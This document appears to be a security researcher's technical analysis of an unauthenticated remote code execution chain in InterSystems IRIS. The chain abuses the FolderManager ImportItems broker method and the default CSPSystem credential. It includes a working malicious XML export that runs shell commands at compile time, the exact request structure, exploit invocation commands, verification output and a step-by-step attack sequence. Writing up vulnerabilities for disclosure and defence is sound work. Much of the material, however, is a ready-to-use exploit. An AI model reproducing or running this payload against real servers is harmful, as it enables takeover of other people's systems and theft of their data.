# InterSystems IRIS FolderManager Property Injection RCE - Technical Analysis

## Overview

This vulnerability chain combines property injection into the `%DeepSee.UI.FolderManager` Zen page with compile-time code execution via `$system.OBJ.Load` to achieve unauthenticated remote code execution as the `irisowner` account (uid=51773). The attacker injects two plaintext S-type properties (`directory` and `selectedFiles`) over the CSP broker channel, forcing `ImportItems` to load an attacker-controlled IRIS XML export file with the compile flag. The malicious export contains a `[CodeMode=objectgenerator]` ClassMethod whose body executes at compile time, invoking `$ZF(-100,"","/bin/sh","-c",cmd)` to run an arbitrary operating system command. Command output is redirected to a webroot static file and retrieved through an anonymous HTTP GET.

## Authentication Boundary

The CSP (Cache Server Pages) framework provides a **broker hyperevent** mechanism that lets browser-side JavaScript call server-side ZenMethods over HTTP POST. Two core RPCs exist:

- **InvokeClassMethod (ICM)**: invokes a class method (static)
- **InvokeInstanceMethod (IIM)**: invokes a page component instance method

The broker gateway enforces four gates:

- **Gate A**: the target class `%IsA %ZEN.Component.object`
- **Gate B**: if the target is a page, `pClass == pPageClass` (only the page's own instance methods can be called)
- **Gate C**: the method must be marked `[ ZenMethod ]`
- **Gate D**: an allowlist (disabled by default)

`CSPSystem` is a built-in account created at install time whose **default password is the hardcoded value `SYS`**. The default password is treated as an unauthenticated artifact — every permission, role, ZenMethod, and call reachable by `CSPSystem` is treated as unauthenticated. The broker channel itself (`/csp/sys/%CSP.Broker.cls`) is open to any request holding a `CSPSystem` credential, i.e. an unauthenticated channel.

The total number of ZenMethods callable by `CSPSystem` is **4312**. This vulnerability was the highest-value chain found during a method-by-method audit of that surface.

## Stage 1: Sink Identification

`%DeepSee.UI.FolderManager::ImportItems` is a `[ ZenMethod ]`. Its body:

```objectscript
ClassMethod ImportItems(pProxy As %ZEN.proxyObject) As %String [ ZenMethod ]
{
    Set tDir = ##class(%File).NormalizeDirectory(..directory)
    For n=1:1:..selectedFiles.Size {
        Set tName = ..selectedFiles.GetAt(n)
        Set tFile = tDir _ tName
        Set tCacheExport = $system.OBJ.Load(tFile, "c/display=none")
    }
}
```

**Sink**: `$system.OBJ.Load(tFile, "c/display=none")` — loads an IRIS XML export file and **compiles** it (the `c` flag means compile).

The key observation is that `..directory` and `..selectedFiles` are properties of the FolderManager page instance, typed as `%ZEN.Datatype.string` (an **S-type, plaintext property with no ZENENCRYPT encryption**). They can be injected directly through the IIM `pBody` (a C1-delimited piece array):

- `directory` = piece 26 (`pieces[25]`)
- `selectedFiles` = piece 75 (`pieces[74]`, a C2-delimited list)

## Stage 2: Source Identification

The source is the `pBody` submitted when IIM calls `ImportItems`. `pBody` is an 86-piece array delimited by C1 (`chr(1)` SOH):

- piece 1 = CRC (`3432320972`)
- piece 2 = index
- piece 26 = `directory` (plaintext S-type)
- piece 75 = `selectedFiles` (a C2 `chr(2)` STX delimited file-name list)

Because `directory` and `selectedFiles` are `%ZEN.Datatype.string` (S-type), they are transmitted **in plaintext with no encryption** and are fully attacker-controlled.

## Stage 3: Data Flow

```
Attacker HTTP POST /csp/sys/%CSP.Broker.cls (IIM)
  WARG_2 = "ImportItems"
  WARG_5 = header = "%DeepSee.UI.FolderManager" + C4 + "1" + C1 + "1"
  WARG_6 = pBody = C1.join(pieces)  // pieces[25]=directory, pieces[74]=selectedFiles
    |
broker gate A-D pass (FolderManager IsA %ZEN.Component.object; pClass==pPageClass; ImportItems is ZenMethod; allowlist off)
    |
ImportItems(pProxy) executes
  tDir = NormalizeDirectory(..directory)   // attacker-injected "/usr/irissys/mgr/Temp/"
  tName = ..selectedFiles.GetAt(n)         // attacker-injected "pwn7750.xml"
  tFile = tDir _ tName                     // "/usr/irissys/mgr/Temp/pwn7750.xml"
  $system.OBJ.Load(tFile, "c/display=none")  // load + compile
```

The attacker first seeds the malicious IRIS XML export onto disk through **ReceiveFragment** (an ICM, `svgImageProvider.ReceiveFragment`, spec=`L,O`, where the proxyObject carries part+code), writing it to `/usr/irissys/mgr/Temp/pwn7750.xml`.

## Stage 4: Exploit Construction

The malicious IRIS XML export uses the critical format `generator="IRIS" version="26"` (not `Cache`/`version=25`). The generator body uses `$ZF(-100,"","/bin/sh","-c",cmd)` to execute an OS command, redirecting output to a webroot static file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Export generator="IRIS" version="26">
<Class name="User.RCE<rand>">
<Super>%RegisteredObject</Super>
<TimeCreated>61203,29408.203384</TimeCreated>
<Method name="Gen">
<ClassMethod>1</ClassMethod>
<CodeMode>objectgenerator</CodeMode>
<FormalSpec></FormalSpec>
<ReturnType>%Status</ReturnType>
<Implementation><![CDATA[
 Set tSC=$ZF(-100,"","/bin/sh","-c","{ <cmd> ; } > /usr/irissys/csp/sys/<rand>.css 2>&1")
 Open "/tmp/<rand>.diag":"WNU":0
 If $T { Use "/tmp/<rand>.diag" Write "rc="_tSC_" ZE="_$ZE Close "/tmp/<rand>.diag" }
 Quit $$$OK
]]></Implementation>
</Method>
</Class>
</Export>
```

**Core mechanism**: a ClassMethod with `<CodeMode>objectgenerator</CodeMode>` has its `<Implementation>` body executed **at class compile time** (not at call time). `OBJ.Load` with the `c` flag triggers compilation, the generator body runs, and `$ZF(-100,"","/bin/sh","-c",cmd)` executes an arbitrary OS command as `irisowner`. Command output is redirected to a webroot static file with a brace group `{ cmd ; } > file 2>&1` that captures all sub-command output.

This bypasses the CSP auto-compile restriction (DP-441283, IRIS 2025.1.1+/2025.2.0+ default `AutoCompile=false`) because the chain does not rely on CSP auto-compilation — `ImportItems` explicitly calls `OBJ.Load("c")` to compile on demand.

## Stage 5: Dynamic Verification

**Execution**:

```bash
# SSH tunnel (IRIS port bound to 127.0.0.1 only)
ssh -fN -L 52774:127.0.0.1:52773 <user>@<target-server>
# Single command
python3 exploit.py 127.0.0.1 52774 "id"
# Multiple commands
python3 exploit.py 127.0.0.1 52774 "hostname; whoami; uname -sr"
```

**Script stdout (RUN: id)**:

```
[*] Target 127.0.0.1:52774  auth=CSPSystem:***  (CSPSystem = unauth per scope)
[+] Seeded FolderManager. CSPCHD=0000000100008AZElrJT...
[+] Executing: id
[+] Command executed (irisowner). Output via anonymous GET http://127.0.0.1:52774/csp/sys/rce519341.css:
------------------------------------------------------------
uid=51773(irisowner) gid=51773(irisowner) groups=51773(irisowner)
------------------------------------------------------------
```

**HTTP responses**:

- ReceiveFragment (ICM): `200 OK len=589`, standard broker wrapping with no error — the malicious XML is written to `/usr/irissys/mgr/Temp/pwn<rand>.xml`
- ImportItems (IIM): `200`, body `#OK\r\n1 item(s) imported.\n - pwn<rand>.xml` — `OBJ.Load` imported and compiled successfully, the generator body executed
- Anonymous GET `/csp/sys/<rand>.css`: `200 OK`, `Content-Type: text/css`, response body = OS command output (no authentication required)

**Target-side verification** (reading the container filesystem):

```
$ docker exec <iris-container> ls -la /usr/irissys/csp/sys/rce519341.css
-rw-rw-r-- 1 irisowner irisowner 66 Jul 16 ... /usr/irissys/csp/sys/rce519341.css
$ docker exec <iris-container> cat /usr/irissys/csp/sys/rce519341.css
uid=51773(irisowner) gid=51773(irisowner) groups=51773(irisowner)
$ docker exec <iris-container> cat /tmp/rce519341.css.diag
rc=0 ZE=
```

**Evidence**:

- Output file owner = `irisowner` (the IRIS process identity, not written by the attacker)
- Diagnostic marker `rc=0 ZE=` — `$ZF(-100)` returned 0 (success), `$ZE` empty (no error)
- Anonymous GET retrieved content identical to the target-side `cat` — end-to-end retrieval confirmed
- Re-running after cleanup succeeds every time — stable and reproducible

## Stage 6: OS Command Execution Refinement

The objectgenerator body's `$ZF(-100,"","/bin/sh","-c",cmd)` executes arbitrary OS commands as `irisowner` (uid=51773). Command output is redirected to the webroot static file `/usr/irissys/csp/sys/<rand>.css` and retrieved via anonymous GET.

**Key correction** (overturning an earlier "127 unreachable" conclusion):

| Syntax | Result | Root Cause |
|--------|--------|------------|
| `$ZF(-100,"/SHELL","cmd")` | sc=127 (command not found) | /SHELL mode treats the whole string as the command name (wrong syntax) |
| `$ZF(-100,"","/bin/sh","-c",cmd)` | rc=0 success | Direct argv format, correct |

The earlier 127 was caused by **wrong syntax** (`/SHELL`), not a permission block. The correct argv format is **fully reachable** in the CSPSystem + generator compile-time context, returning rc=0 and executing arbitrary OS commands as `irisowner`. Diagnostic evidence: `/tmp/<rand>.diag` = `rc=0 ZE=`.

**Write scope**: the objectgenerator body can also write the **entire IRIS installation tree** (owner=irisowner): `/usr/irissys/csp/sys/` + `/csp/user/` + `/mgr/` + `/bin/` + `/lib/` are all writable. Writing `.html`/`.css` to the csp/sys webroot is served verbatim by an anonymous GET 200 (static serving, no authentication).

**Output retrieval design**: command output is redirected to a webroot static file and retrieved via anonymous GET. This upgrades a "file write primitive" into "full OS command execution with output retrieval", constituting a genuine unauthenticated RCE (not merely a blind write).

## Complete Attack Sequence

1. **Reach the broker channel**: identify the IRIS Web/HTTP port and confirm the CSPSystem credential is usable
2. **Seed the malicious export**: call `ReceiveFragment` (ICM) to write the attacker-controlled IRIS XML export to `/usr/irissys/mgr/Temp/`
3. **Inject properties**: call `ImportItems` (IIM) with `directory` and `selectedFiles` injected through `pBody`
4. **Trigger compile-time execution**: `OBJ.Load("c")` compiles the export, the `objectgenerator` body runs at compile time
5. **Execute OS command**: `$ZF(-100,"","/bin/sh","-c",cmd)` runs the command as `irisowner`, redirecting output to a webroot static file
6. **Retrieve output**: anonymous HTTP GET on the static file returns the command output with no authentication